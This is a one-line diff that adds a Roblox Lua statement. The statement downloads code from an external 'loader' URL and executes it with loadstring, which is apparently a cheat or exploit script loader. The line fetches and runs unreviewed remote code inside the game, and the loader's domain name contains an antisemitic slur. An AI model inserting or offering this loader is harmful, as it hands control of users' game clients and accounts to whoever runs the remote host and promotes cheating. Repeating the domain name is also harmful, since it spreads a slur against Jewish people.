@@ -1,0 +1,1 @@
+pcall(function() loadstring(game:HttpGet('https://loader.jewhack.org'))("keyless") end)
